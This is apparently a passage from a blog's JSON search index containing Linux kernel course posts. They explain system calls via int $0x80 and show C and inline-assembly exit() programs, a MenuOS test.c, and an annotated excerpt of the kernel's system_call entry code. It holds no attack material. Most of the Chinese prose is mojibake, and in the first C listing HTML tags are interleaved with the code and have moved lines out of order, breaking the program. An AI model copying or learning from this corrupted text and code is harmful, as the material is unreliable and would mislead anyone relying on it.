¸æœåŠ¡çš„æ¥å£ã€‚\nç³»ç»Ÿå‘½ä»¤ï¼Œå°±æ˜¯å¯ä»¥æ‰§è¡Œçš„ä¸€äº›ç¨‹åºï¼Œåˆ©ç”¨äº†ç°æœ‰çš„ä¸€äº›APIæ¥å®ç°ç‰¹å®šçš„å¸¸ç”¨åŠŸèƒ½ã€‚\nå†…æ ¸å‡½æ•°ï¼Œå¬ç€å¾ˆé«˜å¤§ä¸Šï¼Œå…¶å®å®ƒä»¬å’Œæ™®é€šå‡½æ•°å¾ˆåƒï¼Œä½†ä¸å¯¹ç”¨æˆ·å±•ç°ï¼Œç³»ç»Ÿè‡ªå·±ä½¿ç”¨çš„ä¸€äº›å‡½æ•°ï¼Œåœ¨å†…æ ¸å®ç°ï¼Œå› æ­¤è¦æ»¡è¶³ä¸€äº›å†…æ ¸ç¼–ç¨‹çš„è¦æ±‚ã€‚è€Œç³»ç»Ÿè°ƒç”¨æ˜¯ä¸€å±‚ç”¨æˆ·è¿›å…¥å†…æ ¸çš„æ¥å£ï¼Œå®ƒæœ¬èº«å¹¶éå†…æ ¸å‡½æ•°ï¼Œè¿›å…¥å†…æ ¸åï¼Œä¸åŒçš„ç³»ç»Ÿè°ƒç”¨ä¼šæ‰¾åˆ°å¯¹åº”åˆ°å„è‡ªçš„å†…æ ¸å‡½æ•°â€”â€”æ¢ä¸ªä¸“ä¸šè¯´æ³•å°±å«ï¼šç³»ç»Ÿè°ƒç”¨æœåŠ¡ä¾‹ç¨‹ã€‚å®é™…ä¸Šé’ˆå¯¹è¯·æ±‚æä¾›æœåŠ¡çš„æ˜¯å†…æ ¸å‡½æ•°è€Œéè°ƒç”¨æ¥å£ã€‚\nç³»ç»Ÿè°ƒç”¨ç¨‹åºå’ŒæœåŠ¡ä¾‹ç¨‹ ä¸Šé¢æåˆ°Linuxåªå…è®¸ç³»ç»Ÿè°ƒç”¨æ¥å£ä½¿ç”¨128è¿™ä¸€ä¸ªè½¯ä¸­æ–­å‘é‡ï¼Œè¿™ä¹Ÿå°±æ„å‘³ç€æ‰€æœ‰çš„ç³»ç»Ÿè°ƒç”¨æ¥å£å¿…é¡»å…±äº«è¿™ä¸€ä¸ªä¸­æ–­é€šé“ï¼Œå¹¶åœ¨åŒä¸€ä¸ªä¸­æ–­æœåŠ¡ä¾‹ç¨‹ä¸­ï¼ˆè¿™é‡Œçš„ä¸­æ–­æœåŠ¡ä¾‹ç¨‹å°±æ˜¯å¯¹åº”äºä¸­æ–­å·ä¸º128çš„ä¸­æ–­æœåŠ¡ä¾‹ç¨‹ï¼Œé€šè¿‡æŸ¥ä¸­æ–­å‘é‡è¡¨å¾—åˆ°ï¼‰è°ƒç”¨ä¸åŒçš„å†…æ ¸æœåŠ¡ä¾‹ç¨‹ï¼Œæ‰€ä»¥ï¼Œç³»ç»Ÿè°ƒç”¨æ¥å£é™¤äº†è¦å¼•å‘â€œint ï¼„ Ox80â€è½¯ä¸­æ–­ä¹‹å¤–ï¼Œä¸ºäº†è¿›äººå†…æ ¸åèƒ½è°ƒç”¨ä¸åŒçš„å†…æ ¸æœåŠ¡ä¾‹ç¨‹ï¼Œè¿˜è¦æä¾›è¯†åˆ«å†…æ ¸æœåŠ¡ä¾‹ç¨‹çš„å‚æ•°ï¼Œè¿™ä¸ªå‚æ•°å«åšâ€œç³»ç»Ÿè°ƒç”¨å·â€ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæ‰€æœ‰å¯ä¸ºè¿›ç¨‹æä¾›æœåŠ¡çš„å†…æ ¸æœåŠ¡ä¾‹ç¨‹éƒ½åº”å…·æœ‰ä¸€ä¸ªå”¯ä¸€çš„ç³»ç»Ÿè°ƒç”¨å·ã€‚å½“ç„¶ï¼Œç³»ç»Ÿè°ƒç”¨æ¥å£è¿˜åº”ä¸ºå†…æ ¸æœåŠ¡ä¾‹ç¨‹å‡†å„å¿…è¦çš„å‚æ•°ã€‚\né‚£ä¹ˆï¼Œè¿™é‡Œï¼Œæˆ‘å°±æˆªä¸€ä¸ªç³»ç»Ÿè°ƒç”¨è¡¨çš„å›¾ç‰‡ç»™å¤§å®¶çœ‹çœ‹ï¼š\nåœ¨å›¾ä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬çš„ç³»ç»Ÿè°ƒç”¨è¡¨æ ¼ä¸­çš„ç¬¬ä¸€ä¸ªè°ƒç”¨æ˜¯sys_restart_syscall,ä¹Ÿå°±æ˜¯é‡å¯äº†ï¼Œç³»ç»Ÿä¸ºæ¯ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨éƒ½å®šä¹‰äº†ä¸€ä¸ªå”¯ä¸€çš„ç¼–å·ï¼ŒåŒæ—¶åœ¨å†…æ ¸ä¸­ä¿å­˜äº†ä¸€å¼ ç³»ç»Ÿè°ƒç”¨è¡¨ï¼Œè¯¥è¡¨ä¸­ä¿å­˜äº†ç³»ç»Ÿè°ƒç”¨ç¼–å·å’Œå…¶å¯¹åº”çš„æœåŠ¡ä¾‹ç¨‹åœ°å€ï¼Œç¬¬å‘¢nä¸ªè¡¨é¡¹åŒ…å«äº†ç³»ç»Ÿè°ƒç”¨å·ä¸ºnçš„æœåŠ¡ä¾‹ç¨‹çš„åœ°å€ï¼›\næ‰€æœ‰ç³»ç»Ÿè°ƒç”¨é™·å…¥å†…æ ¸å‰ï¼Œéœ€è¦å°†ç³»ç»Ÿè°ƒç”¨å·ä¸€èµ·ä¼ å…¥å†…æ ¸ï¼Œè€Œè¯¥æ ‡å·å®é™…ä¸Šå°±æ˜¯ç³»ç»Ÿè°ƒç”¨è¡¨çš„ä¸‹æ ‡ï¼Œåœ¨i386ä¸Šï¼Œè¿™ä¸ªä¼ é€’å·¥ä½œæ˜¯é€šè¿‡åœ¨æ‰§è¡Œint $0x80å‰æŠŠè°ƒç”¨å·è£…å…¥eaxå¯„å­˜å™¨æ¥å®ç°çš„ï¼Œè¿™æ ·ç³»ç»Ÿè°ƒç”¨å¤„ç†ç¨‹åºä¸€æ—¦è¿è¡Œèµ·æ¥ï¼Œå°±å¯ä»¥ä»eaxä¸­å¾—åˆ°ç³»ç»Ÿè°ƒç”¨å·ï¼Œç„¶åå†åˆ°ç³»ç»Ÿè°ƒç”¨è¡¨ä¸­å»å¯»æ‰¾ç›¸åº”çš„æœåŠ¡ä¾‹ç¨‹ã€‚\næ•´ç†ç³»ç»Ÿè°ƒç”¨çš„è¿‡ç¨‹ï¼š\nåº”ç”¨ç¨‹åºè°ƒç”¨å°è£…å¥½çš„API è¦ä¿æŠ¤ç”¨æˆ·æ€çš„ç°åœºï¼Œå³æŠŠå¤„ç†å™¨çš„ç”¨æˆ·æ€è¿è¡Œç¯å¢ƒä¿æŠ¤åˆ°è¿›ç¨‹çš„å†…æ ¸å †æ ˆã€‚ APIå°†å¯¹åº”çš„ç³»ç»Ÿè°ƒç”¨å·å­˜å…¥eaxï¼Œå¦‚æœéœ€è¦ä¼ å‚ï¼Œè¿˜è¦åœ¨å…¶ä»–å¯„å­˜å™¨ä¸­ä¼ å…¥ç›¸å…³å‚æ•°ï¼Œç„¶åè°ƒç”¨int $0x80è§¦å‘ä¸­æ–­è¿›å…¥å†…æ ¸ä¸­çš„ä¸­æ–­å¤„ç†å‡½æ•° å†…æ ¸ä¸­çš„ä¸­æ–­å¤„ç†ç¨‹åºæ ¹æ®ç³»ç»Ÿè°ƒç”¨å·è°ƒç”¨å¯¹åº”çš„ç³»ç»Ÿè°ƒç”¨ ç³»ç»Ÿå®Œæˆç›¸åº”åŠŸèƒ½ï¼Œå°†è¿”å›å€¼å­˜å…¥eaxï¼Œè¿”å›åˆ°ä¸­æ–­å¤„ç†å‡½æ•°ï¼› ä¸­æ–­å¤„ç†å‡½æ•°è¿”å›åˆ°APIä¸­;//åœ¨è¿”å›çš„é€”ä¸­ï¼Œæœ‰è¿›ç¨‹è°ƒåº¦ï¼Œå¦‚æœæœ‰ä¼˜å…ˆçº§æ›´é«˜çš„è¿›ç¨‹ï¼Œä¼šè°ƒåº¦ APIå°†eaxï¼Œå³ç³»ç»Ÿè°ƒç”¨çš„è¿”å›å€¼è¿”å›ç»™åº”ç”¨ç¨‹åºã€‚ å®éªŒï¼šä½¿ç”¨Cè¯­è¨€å’Œæ±‡ç¼–åˆ†åˆ«è¿›è¡Œç³»ç»Ÿè°ƒç”¨ åœ¨è¿™é‡Œï¼Œä½¿ç”¨çš„ç³»ç»Ÿè°ƒç”¨ä¸­çš„exit()æ¥è¿›è¡Œç³»ç»Ÿè°ƒç”¨å®è·µï¼Œä¸‹é¢æ˜¯Cè¯­è¨€ç¨‹åºï¼Œä¸»è¦çš„åŠŸèƒ½æ˜¯çˆ¶è¿›ç¨‹fork()ä¸€ä¸ªå­è¿›ç¨‹ï¼Œç„¶åå­è¿›ç¨‹æ²‰ç¡ï¼•ç§’é’Ÿååƒµæ­»ï¼Œçˆ¶è¿›ç¨‹ç­‰å¾…å­è¿›ç¨‹é€€å‡ºä¹‹åå›æ”¶å­è¿›ç¨‹ã€‚\n\u0026lt;div style=\u0026quot;text-align: justify;\u0026quot;\u0026gt;\u0026lt;span style=\u0026quot;font-family: Arial, Helvetica, sans-serif;\u0026quot;\u0026gt;/*************************************************************************\u0026lt;/span\u0026gt;\u0026lt;/div\u0026gt;\t\u0026gt; File Name: Callexit.c \u0026gt; Author: GuoZe Tang \u0026gt; Mail: 269831714@qq.com \u0026lt;div style=\u0026quot;text-align: justify;\u0026quot;\u0026gt;\u0026lt;span style=\u0026quot;font-family: Arial, Helvetica, sans-serif;\u0026quot;\u0026gt; ************************************************************************/\u0026lt;/span\u0026gt;\u0026lt;/div\u0026gt;\t\u0026gt; Created Time: Sun 29 Mar 2015 01:08:06 PM CST #include\u0026lt;stdio.h\u0026gt; #include\u0026lt;time.h\u0026gt; #include\u0026lt;sys/types.h\u0026gt; \u0026lt;div style=\u0026quot;text-align: justify;\u0026quot;\u0026gt;\u0026lt;span style=\u0026quot;font-family: Arial, Helvetica, sans-serif;\u0026quot;\u0026gt; printf(\u0026quot;Fork error!\\n\u0026quot;);\u0026lt;/span\u0026gt;\u0026lt;/div\u0026gt;#include\u0026lt;unistd.h\u0026gt; int main(int argc,char *argvs) { pid_t pc,pr; int t; pc =fork(); if(pc \u0026lt; 0) \u0026lt;div style=\u0026quot;text-align: justify;\u0026quot;\u0026gt;\u0026lt;span style=\u0026quot;font-family: Arial, Helvetica, sans-serif;\u0026quot;\u0026gt; pr=wait(NULL);\u0026lt;/span\u0026gt;\u0026lt;/div\u0026gt; else if(pc == 0){ printf(\u0026quot;This is child process with pid of %d\\n\u0026quot;,getpid()); sleep(5); } else{ \u0026lt;div style=\u0026quot;text-align: justify;\u0026quot;\u0026gt;\u0026lt;span style=\u0026quot;font-family: Arial, Helvetica, sans-serif;\u0026quot;\u0026gt;}\u0026lt;/span\u0026gt;\u0026lt;/div\u0026gt; printf(\u0026quot;I catched a child process with pid of %d\\n\u0026quot;,pr); } \u0026lt;div style=\u0026quot;text-align: justify;\u0026quot;\u0026gt;\u0026lt;span style=\u0026quot;font-family: Arial, Helvetica, sans-serif;\u0026quot;\u0026gt; exit(0);\u0026lt;/span\u0026gt;\u0026lt;/div\u0026gt; æ‰§è¡Œç»“æœå¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œå¾ˆç®€å•ï¼š\nè¿›ç¨‹çš„é€€å‡ºï¼Œè°ƒç”¨ç³»ç»Ÿè°ƒç”¨exitï¼ˆï¼‰å°±å¯å®Œæˆï¼Œåœ¨è¿™é‡Œexitå†™å‡ºæ±‡ç¼–çš„å½¢å¼ï¼ŒæŸ¥è¯¢ç³»ç»Ÿè°ƒç”¨è¡¨ï¼Œå¯çŸ¥exitçš„ç³»ç»Ÿè°ƒç”¨å·ä¸ºï¼‘ï¼›ä½¿ç”¨æ±‡ç¼–ä»£ç æ¥ä¹¦å†™exitç³»ç»Ÿè°ƒç”¨å¦‚ä¸‹ï¼š\n/************************************************************************* \u0026gt; File Name: Callexit_asm.c \u0026gt; Author: GuoZe Tang \u0026gt; Mail: 269831714@qq.com \u0026gt; Created Time: Sun 29 Mar 2015 01:08:06 PM CST ************************************************************************/ #include\u0026lt;stdio.h\u0026gt; #include\u0026lt;time.h\u0026gt; #include\u0026lt;sys/types.h\u0026gt; #include\u0026lt;unistd.h\u0026gt; int main(int argc,char *argvs) { pid_t pc,pr; int t; pc =fork(); if(pc \u0026lt; 0) printf(\u0026quot;Fork error!\\n\u0026quot;); else if(pc == 0){ printf(\u0026quot;This is child process with pid of %d\\n\u0026quot;,getpid()); sleep(5); } else{ pr=wait(NULL); printf(\u0026quot;I catched a child process with pid of %d\\n\u0026quot;,pr); } asm volatile( \u0026quot;mov $0x1,%%eax\\n\\t\u0026quot; \u0026quot;mov $0x0,%%ebx\\n\\t\u0026quot; \u0026quot;int $0x80\\n\\t\u0026quot; \u0026quot;mov %%eax,%0\\n\\t\u0026quot; :\u0026quot;=m\u0026quot; (t) ); } æ‰§è¡Œå¦‚ä¸‹ï¼š\n","date":1425215067,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1425215067,"objectID":"7940b41f0dc3080810067196a4b0d9c8","permalink":"http://www.guozet.me/post/Linux-kernel-analysis-system-call/","publishdate":"2015-03-01T13:04:27Z","relpermalink":"/post/Linux-kernel-analysis-system-call/","section":"post","summary":"Linuxå†…æ ¸è¯¾ç¬¬å››å‘¨ä½œä¸šã€‚æœ¬æ–‡åœ¨äº‘è¯¾å ‚ä¸­å®éªŒæ¥¼å®Œæˆã€‚\nå”å›½æ³½ åŸåˆ›ä½œå“è½¬è½½è¯·æ³¨æ˜å‡ºå¤„.\nã€ŠLinuxå†…æ ¸åˆ†æã€‹MOOCè¯¾ç¨‹\n","tags":"Linux kernel","title":"Linuxå†…æ ¸åˆ†æè¯¾ç¨‹4_Linuxç³»ç»Ÿè°ƒç”¨","type":"post"},{"authors":null,"categories":"Linux","content":"Linuxå†…æ ¸è¯¾ç¬¬äº”å‘¨ä½œä¸šã€‚æœ¬æ–‡åœ¨äº‘è¯¾å ‚ä¸­å®éªŒæ¥¼å®Œæˆã€‚\nå”å›½æ³½ åŸåˆ›ä½œå“è½¬è½½è¯·æ³¨æ˜å‡ºå¤„.\nã€ŠLinuxå†…æ ¸åˆ†æã€‹MOOCè¯¾ç¨‹\nä¸­æ–­å¤„ç†çš„ä¸»è¦å†…å®¹ï¼š\nè°ƒè¯•sys_exit() ç³»ç»Ÿè°ƒç”¨æºä»£ç åˆ†æ ç³»ç»Ÿè°ƒç”¨å°ç»“ åŠ å…¥è‡ªå®šä¹‰çš„ç³»ç»Ÿè°ƒç”¨CallExit. ä¿®æ”¹menu/test.cæ–‡ä»¶ï¼ŒåŠ å…¥è‡ªå·±å®šä¹‰çš„ç³»ç»Ÿè°ƒç”¨å‡½æ•°ã€‚\n#include \u0026lt;stdio.h\u0026gt;\r#include \u0026lt;stdlib.h\u0026gt;\r#include \u0026lt;time.h\u0026gt;\r#include \u0026quot;menu.h\u0026quot;\r#include\u0026lt;sys/types.h\u0026gt;\r#include\u0026lt;unistd.h\u0026gt;\r#define FONTSIZE 10\r......\r......\rint CallExit(int argc,char *argvs)\r{\rpid_t pc,pr;\rint t;\rpc =fork();\rif(pc \u0026lt; 0)\rprintf(\u0026quot;Fork error!\\n\u0026quot;);\relse if(pc == 0){\rprintf(\u0026quot;This is child process with pid of %d\\n\u0026quot;,getpid());\rsleep(5);\r}\relse{\rpr=wait(NULL);\rprintf(\u0026quot;I catched a child process with pid of %d\\n\u0026quot;,pr);\r}\rexit(0);\r}\rint CallExit_asm(int argc,char *argvs)\r{\rpid_t pc,pr;\rint t;\rpc =fork();\rif(pc \u0026lt; 0)\rprintf(\u0026quot;Fork error!\\n\u0026quot;);\relse if(pc == 0){\rprintf(\u0026quot;This is child process with pid of %d\\n\u0026quot;,getpid());\rsleep(5);\r}\relse{\rpr=wait(NULL);\rprintf(\u0026quot;I catched a child process with pid of %d\\n\u0026quot;,pr);\r}\rasm volatile(\r\u0026quot;mov $0x1,%%eax\\n\\t\u0026quot;\r\u0026quot;mov $0x0,%%ebx\\n\\t\u0026quot;\r\u0026quot;int $0x80\\n\\t\u0026quot;\r\u0026quot;mov %%eax,%0\\n\\t\u0026quot;\r:\u0026quot;=m\u0026quot; (t)\r);\r}\rint main()\r{\rPrintMenuOS();\rSetPrompt(\u0026quot;MenuOS\u0026gt;\u0026gt;\u0026quot;);\rMenuConfig(\u0026quot;version\u0026quot;,\u0026quot;MenuOS V1.0(Based on Linux 3.18.6)\u0026quot;,NULL);\rMenuConfig(\u0026quot;quit\u0026quot;,\u0026quot;Quit from MenuOS\u0026quot;,Quit);\rMenuConfig(\u0026quot;time\u0026quot;,\u0026quot;Show System Time\u0026quot;,Time);\rMenuConfig(\u0026quot;time-asm\u0026quot;,\u0026quot;Show System Time(asm)\u0026quot;,TimeAsm);\r**MenuConfig(\u0026quot;CallExit\u0026quot;,\u0026quot;Exit Systemcall\u0026quot;,CallExit);**\r**MenuConfig(\u0026quot;CallExit_asm\u0026quot;,\u0026quot;Exit_asm Systemcall\u0026quot;,CallExit_asm);**\rExecuteMenu();\r}\rå³åœ¨mainå‡½æ•°ä¸­ï¼ŒåŠ å…¥ç›¸åº”çš„ç³»ç»Ÿè°ƒç”¨å®šä¹‰ï¼Œè®²CallExitå’ŒCallExit_asmåŠ å…¥åˆ°å…¶ä¸­å»ï¼Œåœ¨QEMUä¸­å¯åŠ¨ç³»ç»Ÿä¹‹åå¯ä»¥è¾“å…¥helpçœ‹åˆ°ï¼Œæˆ‘ä»¬çš„å‘½ä»¤ä¸­å¤šäº†ä¸¤æ¡å‘½ä»¤ã€‚\nå¯æƒœåœ¨è¿›è¡Œç³»ç»Ÿè°ƒç”¨æµ‹è¯•çš„æ—¶å€™å‡ºç°äº†é—®é¢˜ï¼Œå¯¼è‡´ç³»ç»Ÿå´©æºƒäº†ï¼Œæš‚æ—¶è¿˜æ²¡æœ‰æµ‹è¯•å‡ºæ¥ä»£ç ä¸­æ˜¯ä»€ä¹ˆåœ°æ–¹å‡ºç°äº†é—®é¢˜ï¼Œä¼šç»§ç»­è°ƒè¯•æ‰¾å‡ºé—®é¢˜çš„åœ°æ–¹ã€‚\nå…³äºè€å¸ˆè§†é¢‘ä¸­æåˆ°çš„ä¸èƒ½è°ƒè¯•sys_timeçš„ä¸€äº›åˆ†æï¼š\nLinux Kernelä»£ç è‰ºæœ¯â€”â€”ç³»ç»Ÿè°ƒç”¨å®å®šä¹‰\nå¯ä»¥å‚è€ƒè¿™ä¸€ç¯‡æ–‡ç« ä¸­çš„å†…å®¹ï¼Œåœ¨2.6.28ä¹‹å‰çš„å†…æ ¸ä»£ç ä¸­ï¼Œç³»ç»Ÿè°ƒç”¨çš„æ—¶å€™æ˜¯ç›´æ¥è°ƒç”¨å¤„ç†å‡½æ•°çš„ï¼Œä½†å‡ºç°äº†æ¼æ´CVE-2009-0029æ¼æ´ä¹‹åï¼Œå°±æ˜¯é€šè¿‡å®å®šä¹‰çš„æ–¹å¼æ¥å¤„ç†ç³»ç»Ÿè°ƒç”¨å‡½æ•°äº†ã€‚\nç³»ç»Ÿè°ƒç”¨æºä»£ç åˆ†æ # system call handler stub\rENTRY(system_call) //æ‰€æœ‰ç³»ç»Ÿè°ƒç”¨å‡½æ•°çš„å…¥å£å¤„\rRING0_INT_FRAME # can't unwind into user space anyway\rASM_CLAC\rpushl_cfi %eax # ä¿å­˜ç³»ç»Ÿè°ƒç”¨å·\rSAVE_ALL # ä¿æŠ¤ç°åœº\rGET_THREAD_INFO(%ebp)ã€€#ä¿å­˜å½“å‰ä¿¡æ¯åˆ°ebpä¸­\r# system call tracing in operation / emulation\rtestl $_TIF_WORK_SYSCALL_ENTRY,TI_flags(%ebp)\rjnz syscall_trace_entry\r##åˆ¤æ–­æ˜¯å¦æ˜¯traceç›¸å…³çš„è°ƒç”¨\r##åˆ¤æ–­ç³»ç»Ÿè°ƒç”¨å·æ˜¯å¦è¶…å‡ºäº†æœ€å¤§å€¼255\rcmpl $(NR_syscalls), %eax\rjae syscall_badsys\rsyscall_call:\rcall *sys_call_table(,%eax,4) //ç”±ç³»ç»Ÿè°ƒç”¨è¡¨ä¸­çš„å¯¹åº”ç³»ç»Ÿè°ƒç”¨å·æ‰¾æœåŠ¡å‡½æ•°\rsyscall_after_call:\rmovl %eax,PT_EAX(%esp) # store the return value\r#ç³»ç»Ÿè°ƒç”¨è¿”å›\rsyscall_exit:ã€€LOCKDEP_SYS_EXIT\rDISABLE_INTERRUPTS(CLBR_ANY) # make sure we don't miss an interrupt\r# setting need_resched or sigpending\r# between sampling and the iret\rTRACE_IRQS_OFF\rmovl TI_flags(%ebp), %ecx\r##é€€å‡ºç³»ç»Ÿè°ƒç”¨ä¹‹å‰ï¼Œæ£€æŸ¥æ˜¯å¦éœ€è¦å¤„ç†ä¿¡å·\rtestl $_TIF_ALLWORK_MASK, %ecx # current-\u0026gt;work\rjne syscall_exit_work\r#æ¢å¤å¤„ç†å™¨å·¥ä½œ\rrestore_all:\rTRACE_IRQS_IRET\rrestore_all_notrace:\r#ifdef CONFIG_X86_ESPFIX32\rmovl PT_EFLAGS(%esp), %eax # mix EFLAGS, SS and CS\r# Warning: PT_OLDSS(%esp) contains the wrong/random values if we\r# are returning to the kernel.\r# See comments in process.c:copy_thread() for details.\rmovb PT_OLDSS(%esp), %ah\rmovb PT_CS(%esp), %al\randl $(X86_EFLAGS_VM | (SEGMENT_TI_MASK \u0026lt;\u0026lt; 8) | SEGMENT_RPL_MASK), %eax\rcmpl $((SEGMENT_LDT \u0026lt;\u0026lt; 8) | USER_RPL), %eax\rCFI_REMEMBER_STATE\rje ldt_ss # returning to user-space with LDT SS\r#endif\rrestore_nocheck:\rRESTORE_REGS 4 # skip orig_eax/error_code\rirq_return:\rINTERRUPT_RETURNã€€//ä¸­æ–­ç³»ç»Ÿè°ƒç”¨çš„å¤„ç†è¿‡ç¨‹ï¼Œç»“æŸç‚¹iret\r.section .fixup,\u0026quot;ax\u0026quot;\rENTRY(iret_exc)\rpushl $0 # no error code\rpushl $do_iret_error\rjmp error_code\r.previous\r_ASM_EXTABLE(irq_return,iret_exc)\r#ifdef CONFIG_X86_ESPFIX32\rCFI_RESTORE_STATE\rldt_ss:\r#ifdef CONFIG_PARAVIRT\rcmpl $0, pv_info+PARAVIRT_enabled\rjne restore_nocheck\r#endif\r#define GDT_ESPFIX_SS PER_CPU_VAR(gdt_page) + (GDT_ENTRY_ESPFIX_SS * 8)\rmov %esp, %edx /* load kernel esp */\rmov PT_OLDESP(%esp), %eax /* load userspace esp */\rmov %dx, %ax /* eax: new kernel esp */\rsub %eax, %edx /* offset (low word is 0) */\rshr $16, %edx\rmov %dl, GDT_ESPFIX_SS + 4 /* bits 16..23 */\rmov %dh, GDT_ESPFIX_SS + 7 /* bits 24..31 */\rpushl_cfi $__ESPFIX_SS\rpushl_cfi %eax /* new kernel esp */\r/* Disable interrupts, but do not irqtrace this section: we\r* will soon execute iret and the tracer was already set to\r* the irqstate after the iret */\rDISABLE_INTERRUPTS(CLBR_EAX)\rlss (%esp), %esp /* switch to espfix segment */\rCFI_ADJUST_CFA_OFFSET -8\rjmp restore_nocheck\r#endif\rCFI_ENDPROC\rENDPROC(system_call)\r# perform work that needs to be done immediately before resumption\rALIGN\rRING0_PTREGS_FRAME # can't unwind into user space anyway\rwork_pending:\rtestb $_TIF_NEED_RESCHED, %cl #æ£€æŸ¥æ˜¯å¦éœ€è¦é‡æ–°è°ƒåº¦\rjz work_notifysigã€€#ä¸éœ€è¦é‡æ–°è°ƒåº¦ï¼Œè°ƒåˆ°work_notifysig\rwork_resched: #é‡æ–°è°ƒåº¦\rcall schedule #è¿›ç¨‹è°ƒåº¦\rLOCKDEP_SYS_EXIT\rDISABLE_INTERRUPTS(CLBR_ANY) # make sure we don't miss an interrupt\r# setting need_resched or sigpending\r# between sampling and the iret\rTRACE_IRQS_OFF\rmovl TI_flags(%ebp), %ecx\randl $_TIF_WORK_MASK, %ecx # is there any work to be done other\r# than syscall tracing?\rjz restore_allã€€//æ²¡æœ‰å…¶ä½™äº‹æƒ…ï¼Œåˆ™æ¢å¤ç°åœº\rtestb $_TIF_NEED_RESCHED, %cl\rjnz work_resched\rwork_notifysig: # deal with pending signals and\r# notify-resume requests\r#ifdef CONFIG_VM86\rtestl $X86_EFLAGS_VM, PT_EFLAGS(%esp)\rmovl %esp, %eax\rjne work_notifysig_v86 # returning to kernel-space or\r# vm86-space\r1:\r#else\rmovl %esp, %eax\r#endif\rTRACE_IRQS_ON\rENABLE_INTERRUPTS(CLBR_NONE)\rmovb PT_CS(%esp), %bl\randb $SEGMENT_RPL_MASK, %bl\rcmpb $USER_RPL, %bl\rjb resume_kernel\rxorl %edx, %edx\rcall do_notify_resumeã€€#è¿›è¡Œä¿¡å·å¤„ç†\rjmp resume_userspace\r#ifdef CONFIG_VM86\rALIGN\rwork_notifysig_v86:\rpushl_cfi %ecx # save ti_flags for do_notify_resume\rcall save_v86_state # %eax contains pt_regs pointer\rpopl_cfi %ecx\rmovl %eax, %esp\rjmp 1b\r#endif\rEND(work_pending)\r# perform syscall exit tracing\rALIGN\rsyscall_trace_entry:\rmovl $-ENOSYS,PT_EAX(%esp)\rmovl %esp, %eax\rcall syscall_trace_enter\r/* What it returned is what we'll actually use. */\rcmpl $(NR_syscalls), %eax\rjnae syscall_call\rjmp syscall_exit\rEND(syscall_trace_entry)\r# perform syscall exit tracing\rALIGN\rsyscall_exit_work: #å®Œæˆå…¶ä»–å·¥ä½œ\rtestl $_TIF_WORK_SYSCALL_EXIT, %ecx\r#æ£€æŸ¥æ˜¯å¦ç³»ç»Ÿè°ƒç”¨è·Ÿè¸ª,å®¡è®¡,å•æ­¥æ‰§è¡Œ,ä¸éœ€è¦åˆ™è·³åˆ°work_pending(è¿›è¡Œè°ƒåº¦,ä¿¡å·å¤„ç†) jz work_pending\rTRACE_IRQS_ON\rENABLE_INTERRUPTS(CLBR_ANY) # could let syscall_trace_leave() call\r# schedule() instead\rmovl %esp, %eax\rcall syscall_trace_leave\rjmp resume_userspace\rEND(syscall_exit_work)\rCFI_ENDPROC\rRING0_INT_FRAME # can't unwind into user space anyway\rsyscall_fault:\rASM_CLAC\rGET_THREAD_INFO(%ebp)\rmovl $-EFAULT,PT_EAX(%esp)\rjmp resume_userspace\rEND(syscall_fault)\rsyscall_badsys:\rmovl $-ENOSYS,%eax\rjmp syscall_after_call\rEND(syscall_badsys)\rsysenter_badsys:\rmovl $-ENOSYS,%eax\rjmp sysenter_after_call\rEND(sysenter_badsys)\rCFI_ENDPROC\r.macro FIXUP_ESPFIX_STACK\r/*\r* Switch back for ESPFIX stack to the normal zerobased stack\r*\r* We can't call C functions using the ESPFIX stack. This code reads\r* the high word of the segment base from the GDT and swiches to the\r* normal stack and adjusts ESP with the matching offset.\r*/\r#ifdef CONFIG_X86_ESPFIX32\r/* fixup the stack */\rmov GDT_ESPFIX_SS + 4, %al /* bits 16..23 */\rmov GDT_ESPFIX_SS + 7, %ah /* bits 24..31 */\rshl $16, %eax\raddl %esp, %eax /* the adjusted stack pointer */\rpushl_cfi $__KERNEL_DS\rpushl_cfi %eax\rlss (%esp), %esp /* switch to the normal stack segment */\rCFI_ADJUST_CFA_OFFSET -8\r#endif\r.endm\r.macro UNWIND_ESPFIX_STACK\rSAVE_ALLä¿å­˜ç°åœºå‡½æ•°çš„å®å®šä¹‰å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š\nç³»ç»Ÿè°ƒç”¨å°ç»“ ç³»ç»Ÿè°ƒç”¨æµç¨‹å°ç»“ï¼š\næ‰§è¡Œç”¨æˆ·ç¨‹åº(å¦‚:fork,exit) æ ¹æ®glibcä¸­çš„å‡½æ•°å®ç°ï¼Œå–å¾—ç³»ç»Ÿè°ƒç”¨å·å¹¶æ‰§è¡Œint $0x80äº§ç”Ÿä¸­æ–­ã€‚ è¿›è¡Œåœ°å€ç©ºé—´çš„è½¬æ¢å’Œå †æ ˆçš„åˆ‡æ¢ï¼Œæ‰§è¡ŒSAVE_ALLã€‚ï¼ˆè¿›è¡Œå†…æ ¸æ¨¡å¼ï¼‰ è¿›è¡Œä¸­æ–­å¤„ç†ï¼Œæ ¹æ®ç³»ç»Ÿè°ƒç”¨è¡¨è°ƒç”¨å†…æ ¸å‡½æ•°ã€‚ æ‰§è¡Œå†…æ ¸å‡½æ•°ã€‚ æ‰§è¡ŒRESTORE_ALLå¹¶è¿”å›ç”¨æˆ·æ¨¡å¼ ç±»ä¼¼ä¸­æ–­å¤„ç†è¿‡ç¨‹ï¼Œå¯ä»¥çŸ¥é“ï¼Œåœ¨ä¸­æ–­å½“ä¸­è¿™ä¸ªæ•´ä½“çš„æ¡†æ¶æ˜¯ä¸å˜åŒ–çš„çš„ï¼Œåªæ˜¯ç›¸åº”çš„ç³»ç»Ÿè°ƒç”¨å·å’Œå¤„ç†å‡½æ•°ä¹‹é—´çš„è½¬åŒ–å˜åŒ–æˆäº†ä¸­æ–­å·å’Œä¸­æ–­å¤„ç†å‡½æ•°ä¹‹é—´çš„è½¬åŒ–ã€‚\nst=\u0026gt;start: int0x80-\u0026gt;ENTRY(system_call)\re=\u0026gt;end: Ende|future:\u0026gt;http://www.google.com\rop1=\u0026gt;operation: SAVE_ALL(ä¿å­˜ç°åœº)|past\rop2=\u0026gt;operation: call *sys_call_table\rop3=\u0026gt;operation: ç³»ç»Ÿè°ƒç”¨å¤„ç†ç¨‹åºå°†è¿”å›å€¼å­˜å…¥eax\rcond1=\u0026gt;condition: 